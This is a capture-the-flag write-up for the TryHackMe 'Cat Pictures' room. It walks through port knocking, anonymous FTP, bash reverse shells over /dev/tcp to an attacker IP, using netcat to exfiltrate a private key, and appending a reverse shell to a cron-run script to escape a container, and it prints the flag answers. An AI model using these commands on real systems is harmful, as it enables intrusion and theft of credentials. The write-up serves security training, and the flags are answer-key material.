# [Cat Pictures](https://tryhackme.com/room/catpictures)

> I made a forum where you can post cute cat pictures!

## Scanning

scan the machine

```
nmap -sS -sV -T4 10.10.200.77
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f9b42488-347d-42c2-b2de-132bd1da2c9b)

oke, we have 3 open ports (21, 22, 8080)

## HTTP (optional)

let's check the webpage at port 8080

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/24e50af1-ba5d-4af0-8035-95cfd93e9223)

cool, we have a forum and login form... and a post

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/7d1622cb-8abd-494b-aad8-5b134a19ae7e)

i see a post say we need "knock 4 ports", this term is new for me

## Enumeration

so let's knock port using knock command

```
sudo apt install knockd
knock 10.10.200.77 1111 2222 3333 4444
```

so let's run scan again

```
nmap -sS -sV -sC -T4 10.10.200.77
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a19735d7-38a1-4458-8a89-df5f3c0e0b24)

now, you will see port 21 is open allowed anonymous login

```
ftp 10.10.200.77
ls
get note.txt
exit
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/caa4b5d5-5d7b-47b4-a458-97dc895f5fc3)

so we have a message that there is a internal shell service server on port 4420 with password `sardinethecat`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8c5b6468-a0e4-4825-a545-127e0a353979)

## Exploitation

now, we can use nc to connect to server

```
nc 10.10.200.77 4420
sardinethecat
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b9b664c6-4869-4315-acee-bcdd9b7a37d0)

we are in very restrictive shell "please note: cd commands do not work at the moment, the developers are fixing it at the moment."

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b7995415-4fd5-4c0c-9a2a-34274a07800d)

well a lot restric here

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/ef85692c-ea14-4174-ae1e-235235999db8)

so open a reverse shell to our machine

```
nc -vlnp 1234
```

```
bash -c 'bash -i >& /dev/tcp/10.18.37.45/1234 0>&1'
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/b8694eb8-e8c6-48d4-aac4-fcb13a21d278)

try to run the excutable, it required a password

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e56110ab-11df-45b5-8adc-2ff72962064e)

to break out this restric shell, we need download the file to our machine

```
# our machine
nc -lvnp 1235 > runme
# target machine
nc 10.18.37.45 1235 < /home/catlover/runme
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/5f50349c-2dc7-4a9b-9079-a13ba5845a5e)

```
strings runme
```

so the password is `rebecca`

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3bcab0f5-e690-469d-8374-2d2c1cd87214)

After running runme, a new file id_rsa is created in /home/catlover

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e978afdc-bd36-45b0-9e1a-5ab32f345ba4)

so collect the id_rsa to our machine

```
# our machine
nc -lvnp 1235 > id_rsa
# target machine
nc 10.18.37.45 1235 < /home/catlover/id_rsa
```

so we can connect ssh using private key

```
chmod 600 id_rsa
ssh -i id_rsa catlover@10.10.200.77
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e56f76a7-4e0c-41b4-887d-58ad3c1ed44a)

cool we got root

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/2e554eda-6e52-4148-adcd-f070d995a25a)

| Flag | flag.txt |
| --- | --- |
| Answer | 7cf90a0e7c5d25f1a827d3efe6fe4d0edd63cca9 |

## Privilege Escalation

we are current root, so escalate what? probably we have to escape the docker container

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/15f89000-247b-4b6d-b423-6481d233a918)

```
cat .bash_history
```

i found a clean script

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c6dbde47-3479-44fa-9caa-980fc3c77220)

so reverse shell again

```
nc -vlnp 1234
```

```
echo 'bash -i >&/dev/tcp/10.18.37.45/1234 <&1' >> /opt/clean/clean.sh
```

here you are

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8f5b8693-0063-482b-89aa-444b2862b877)

| Flag | root.txt |
| --- | --- |
| Answer | 4a98e43d78bab283938a06f38d2ca3a3c53f0476 |
